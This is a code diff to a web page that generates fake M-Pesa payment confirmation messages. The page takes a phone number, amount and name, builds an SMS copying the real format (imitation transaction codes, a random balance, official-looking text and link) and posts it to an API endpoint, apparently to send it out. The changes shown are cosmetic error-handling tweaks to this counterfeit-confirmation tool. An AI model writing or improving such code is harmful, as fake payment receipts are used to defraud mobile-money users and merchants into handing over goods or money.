@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -84,6 +85,13 @@ pre {
   margin-top: 15px; 
   white-space: pre-wrap; 
   font-size: 14px;
+  min-height: 40px;
+}
+
+/* Error styling */
+.error-msg {
+  color: #ff5252;
+  border: 1px solid #ff5252;
 }
 
 @media (max-width: 480px) {
@@ -96,25 +104,20 @@ pre {
 <body>
 
 <div class="container">
-  <!-- Step 1: Phone -->
   <div class="step-label active" id="phoneLabel">Enter phone no.</div>
   <input type="text" id="phone" class="active" placeholder="">
   <button id="phoneOkBtn" class="active">OK</button>
 
-  <!-- Step 2: Amount -->
   <div class="step-label" id="amountLabel">Enter Amount</div>
   <input type="number" id="amount" placeholder="">
   <button id="amountOkBtn">OK</button>
 
-  <!-- Step 3: Name -->
   <div class="step-label" id="nameLabel">Enter Full Name</div>
   <input type="text" id="name" placeholder="">
   <button id="nameOkBtn">OK</button>
 
-  <!-- Step 4: Send -->
   <button id="sendBtn">Send </button>
 
-  <!-- Output -->
   <pre id="output"></pre>
 </div>
 
@@ -131,6 +134,16 @@ const amountOkBtn = document.getElementById("amountOkBtn");
 const nameOkBtn = document.getElementById("nameOkBtn");
 const sendBtn = document.getElementById("sendBtn");
 
+// Helper to show statement/error in output
+function showMsg(text, isError = false) {
+  output.textContent = text;
+  if(isError) {
+    output.classList.add("error-msg");
+  } else {
+    output.classList.remove("error-msg");
+  }
+}
+
 function hideAll(){
   document.querySelectorAll(".step-label").forEach(e=>e.classList.remove("active"));
   document.querySelectorAll("input").forEach(e=>e.classList.remove("active"));
@@ -139,6 +152,7 @@ function hideAll(){
 
 function showPhone(){
   hideAll();
+  showMsg(""); // Clear messages when resetting
   document.getElementById("phoneLabel").classList.add("active");
   phone.classList.add("active");
   phoneOkBtn.classList.add("active");
@@ -146,6 +160,7 @@ function showPhone(){
 
 function showAmount(){
   hideAll();
+  showMsg("");
   document.getElementById("amountLabel").classList.add("active");
   amount.classList.add("active");
   amountOkBtn.classList.add("active");
@@ -153,6 +168,7 @@ function showAmount(){
 
 function showName(){
   hideAll();
+  showMsg("");
   document.getElementById("nameLabel").classList.add("active");
   name.classList.add("active");
   nameOkBtn.classList.add("active");
@@ -160,6 +176,7 @@ function showName(){
 
 function showSend(){
   hideAll();
+  showMsg("");
   sendBtn.classList.add("active");
 }
 
@@ -167,24 +184,17 @@ function cost(a){
   return 0;
 }
 
-// UPDATED TOKEN LOGIC
 function token(){
   const now = new Date();
   const start = new Date(now.getFullYear(), 0, 0);
   const diff = now - start;
   const oneDay = 1000 * 60 * 60 * 24;
   const dayOfYear = Math.floor(diff / oneDay);
-
   const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
-  
-  // Logic: Today (Jan 25, 2026) is Day 25. 
-  // Index for 'P' is 15. (25 - 10 = 15).
   let index = (dayOfYear - 10) % 26;
   if (index < 0) index += 26; 
-
   const thirdLetter = alphabet[index]; 
   const randomSuffix = Math.random().toString(36).substring(2, 9).toUpperCase();
-
   return "UA" + thirdLetter + randomSuffix;
 }
 
@@ -198,7 +208,7 @@ function dt(){
 showPhone();
 
 phoneOkBtn.onclick = async ()=>{
-  if(!phone.value.trim()) return alert("Enter phone number");
+  if(!phone.value.trim()) return showMsg("Enter phone number", true);
   try{
     const r = await fetch(`${API}/lookup/${phone.value}`);
     const d = await r.json();
@@ -208,12 +218,12 @@ phoneOkBtn.onclick = async ()=>{
 };
 
 amountOkBtn.onclick = ()=>{
-  if(amount.value <= 0) return alert("Invalid amount");
+  if(amount.value <= 0) return showMsg("Invalid amount", true);
   showName();
 };
 
 nameOkBtn.onclick = ()=>{
-  if(!name.value.trim()) return alert("Enter full name");
+  if(!name.value.trim()) return showMsg("Enter full name", true);
   showSend();
 };
 
@@ -225,7 +235,7 @@ sendBtn.onclick = async ()=>{
   const msg =
 `${t} Confirmed. Ksh${a.toFixed(2)} sent to ${name.value} on ${dt()}. New Mpesa balance is Ksh${(Math.random()*5000+100).toFixed(2)}.Transaction cost, Ksh${c.toFixed(2)}.Amount you can transact within the day is 499,960.00.Save frequent paybills for quick payment on M-PESA app https://m-pesaforbusiness.co.ke`;
 
-  output.textContent = msg;
+  showMsg(msg);
 
   try{
     await fetch(`${API}/send`,{
@@ -242,7 +252,8 @@ sendBtn.onclick = async ()=>{
     });
   }catch{}
 
-  showPhone();
+  // Delay reset so user can read the message, or remove showPhone() to stay on results
+  // showPhone(); 
 };
 </script>
 
